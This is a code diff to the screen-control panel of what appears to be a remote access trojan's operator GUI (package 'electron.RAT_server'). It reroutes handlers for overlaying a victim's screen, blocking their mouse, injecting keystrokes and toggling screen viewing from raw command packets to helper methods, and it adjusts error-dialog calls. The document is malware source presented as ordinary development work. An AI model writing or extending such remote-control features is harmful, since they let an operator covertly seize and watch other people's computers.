@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.net.URL;
 
 import electron.RAT_server;
+import electron.actions.Misc;
 import electron.networking.packets.OutputPacket;
 import electron.utils.Utils;
 import electron.utils.logger;
@@ -58,7 +59,7 @@ public class ScreenViewControls {
 
 	public static void create() throws IOException {
 		if (isCreated) {
-			Utils.showErrorMessage("Incorrect action", "Can't create new Frame", "One frame already exists.");
+			Utils.showErrorMessage("Incorrect action", "Can't create new Frame", "One frame already exists.", false);
 			return;
 		}
 		Stage screenviewstage = new Stage();
@@ -97,40 +98,31 @@ public class ScreenViewControls {
 
 	@FXML
 	private void screen_overlayAction() {
-		OutputPacket.sendOutPacket("/overlay");
+		Misc.toggle_overlay(MainWindowControls.handler, false);
 	}
 
 	@FXML
 	private void screen_blockMouseAction() {
-		OutputPacket.sendOutPacket("/blockmouse");
+		Misc.toggle_blockmouse(MainWindowControls.handler, false);
 	}
 
 	@FXML
 	private void screen_sendkeysAction() {
 		if (MainWindowControls.handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		String keys = screen_keyfield.getText();
-		if (keys.isEmpty()) {
-			return;
-		}
-		if (keys.contains(" ")) {
-			OutputPacket.sendOutPacket("/presskeys " + keys);
-			return;
-		}
-		OutputPacket.sendOutPacket("/presskey " + keys);
-		return;
+		Misc.presskeys(MainWindowControls.handler, screen_keyfield.getText(), false);
 	}
 
 	@FXML
 	private void toggleScreen() {
 		if (MainWindowControls.handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
+					"Select client in 'Connections' pane firstly.", false);
 			return;
 		}
-		OutputPacket.sendOutPacket("/screen");
+		Misc.toggle_screen(MainWindowControls.handler, false);
 	}
 }
